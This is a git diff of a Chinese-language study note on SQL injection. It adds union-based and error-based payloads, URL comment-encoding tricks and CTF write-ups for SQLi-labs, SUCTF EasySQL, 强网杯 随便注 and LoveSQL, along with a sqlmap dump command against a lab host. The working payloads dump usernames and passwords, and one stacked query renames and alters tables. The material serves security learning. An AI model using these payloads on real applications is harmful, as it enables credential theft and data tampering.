@@ -28,17 +28,23 @@ Basic progress:
 
    1. 数据库名`database()`
 
-   2. 使用`information_schema`获得数据表信息
+   2. 使用`information_schema`获得数据库信息
+   
+      ```sql
+      union select 1,group_concat(schema_name),3 from information_schema.schemata
+      ```
+   
+   3. 使用`information_schema`获得数据表信息
       ```sql
       ?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='news')
       ```
-
-   3. 获得列名
+   
+   4. 获得列名
       ```sql
       ?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='news' and table_name='admin')
       ```
-
-   4. 爆破表
+   
+   5. 爆破表
       ```sql
       ?id=-1 union select (select group_concat(username) from admin),(select group_concat(password) from admin)
       ```
@@ -55,7 +61,14 @@ Basic progress:
   * `?id=1'`:  use near ''1'' LIMIT 0,1' at line 1
   * `?id=1'asdf`: near 'asdf' LIMIT 0,1'，**发现使用单引号闭合**
 
-  
+
+### Comment
+
+* \# 用于URL参数时，**会被认为是锚点**，需要使用`%23`替代
+* `--+`同样可以作为注释符，等同于`-- `，但是空格同理会被URL略去，使用URL编码或在后面增加一个字符（使hackbar将空格编码）能够修正错误
+* `/**/`内联注释，等同于空格，用于绕过
+
+
 
 ## SQLi-labs
 
@@ -98,11 +111,16 @@ Basic progress:
    * 两种解题方式
 
      1. 布尔盲注爆破，脚本`sqli-blind-bruteforce-template.py` 多线程爆破数据库
-
+        ```python
+        
+        ```
+     
+        
+     
      2. 错误注入（**Recommended**，如题"Double Query"）。常用报错注入方式：
-
+     
         1. `floor`函数注入 [reference](https://blog.csdn.net/miraclehw/article/details/129250360)
-
+     
            ```sql
            # Prototype (dump user)
            id = 1 AND (SELECT 1 from 
@@ -112,17 +130,17 @@ Basic progress:
            # Payload
            'id=-1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1)) as x from information_schema.tables group by x%23
            ```
-
+     
            * `floor(rand(0)*2)` 固定生成 `01101100111`序列，在执行group by 插入虚表时产生duplicated entry 错误
            * `count(*)`确保返回单行结果，保证内部子查询会对每一行执行
 
         2. `xpath` 报错注入 (`extractvalue` and `updatexml`): require mysql >= 5.1
            在xml路径（xpath）错误时，返回报错
-
+     
            * ` updatexml(XML_document, XPath_string, new_value)`使用不同xml标记匹配和替换xml块
-
+     
            * `extractbalue(XML_document, xpath_string)`从目标XML中返回匹配查询的字符串
-
+     
            * payload
              ```sql
              and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e))
@@ -140,3 +158,163 @@ Basic progress:
    * 也可以使用**sqlmap**: ` sqlmap -u "http://2aba3d8b-3b64-4247-8942-4de7881a9d83.node5.buuoj.cn/Less-8/?id=1" --technique B -D security -T users -C username,password --dump --threads 10 --batch    `
    * ![image-20240801215738108](./SQL Study.assets/image-20240801215738108.png)
    * <img src="./SQL Study.assets/image-20240801215931138.png" alt="image-20240801215931138" style="zoom:50%;" />
+
+
+
+## Examples
+
+### [SUCTF 2019]EasySQL
+
+**过滤**：
+
+* `and`, `or`, `union`
+
+保留：
+
+* `select`
+
+https://blog.csdn.net/StevenOnesir/article/details/110203051
+
+**核心：猜测其结构为类似  `select $[_POST] || flag from flag_table`**
+
+* `num || flag`: 输出恒为 1，`0 || flag` 为 0
+* `str || flag`: 两边都相当于 0，结果为 0
+
+
+
+### [强网杯 2019]随便注
+
+https://blog.csdn.net/m0_73734159/article/details/134049744
+
+1. `1, 2`返回数组
+
+   ```php
+   array(2) {
+     [0]=>
+     string(1) "1"
+     [1]=>
+     string(7) "hahahah"
+   }
+   ```
+   
+2. 返回两列
+
+    ```sql
+    '?inject=2' order by 3,2--+
+    # error 1054 : Unknown column '3' in 'order clause'
+    ```
+
+**ban关键字**： `preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
+
+1. 关键词被ban，使用堆叠注入爆库
+
+    ```sql
+    '?inject=2'; show databases;--+'
+    ```
+
+    ![image-20240804003115542](./SQL Study.assets/image-20240804003115542.png)
+    
+1. 爆表
+    ```sql
+    '?inject=2'; show tables;--+
+    ```
+    
+3. 爆列名
+    ```sql
+    '?inject=2'; show columns from words;--+
+    array(6) {
+      [0]=>
+      string(2) "id"
+      [1]=>
+      string(7) "int(10)"
+      [2]=>
+      string(2) "NO"
+      [3]=>
+      string(0) ""
+      [4]=>
+      NULL
+      [5]=>
+      string(0) ""
+    }
+    array(6) {
+      [0]=>
+      string(4) "data"
+      [1]=>
+      string(11) "varchar(20)"
+      [2]=>
+      string(2) "NO"
+      [3]=>
+      string(0) ""
+      [4]=>
+      NULL
+      [5]=>
+      string(0) ""
+    }
+    'inject=2'; show columns from `1919810931114514`;--+
+    array(6) {
+      [0]=>
+      string(4) "flag"
+      [1]=>
+      string(12) "varchar(100)"
+      [2]=>
+      string(2) "NO"
+      [3]=>
+      string(0) ""
+      [4]=>
+      NULL
+      [5]=>
+      string(0) ""
+    }
+    ```
+
+    **表名为数字需要用反引号包含**
+
+4. >所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把1919810931114514改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。
+
+    ```sql
+    '?inject=1'; rename table words to backup; rename table `1919810931114514` to words; alter table words add id int unsigned not NULL auto_increment primary key; alter table words rename flag to data; --+
+    ```
+
+5. 直接提交 1，得flag
+
+### [极客大挑战 2019]LoveSQL
+
+* `username`, `password`双参数注入，两个参数均存在注入点，单引号闭合
+
+* `username`在前，注释符会遮盖password溢出
+
+* 3列返回
+
+  ```sql
+  '?username=1' order by 4%23&password=123456' order by 1 %23
+  Unknown column '4' in 'order clause'
+  ```
+
+* union select 返回登陆成功
+  ```sql
+  'username=1' union select 1,2,3%23&password=123456' order by 4 %23
+  
+  Login Success!
+  Hello 2!
+  Your password is '3'
+  ```
+
+* 开始爆破
+  ```sql
+  'username=1' union select 1,2,database()%23&password=123456' order by 4 %23
+  geek
+  
+  username=1' union select 1, (select group_concat(schema_name) from information_schema.schemata), database()%23
+  information_schema,performance_schema,mysql,test,geek
+  
+  'username=1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='geek'), database()%23
+  geekuser,l0ve1ysq1
+  
+  'username=1' union select 1, (select group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1')
+  id,username,password
+  
+  'username=1' union select 1, group_concat(username), group_concat(password) from l0ve1ysq1 %23
+  Finish
+  ```
+  
+  
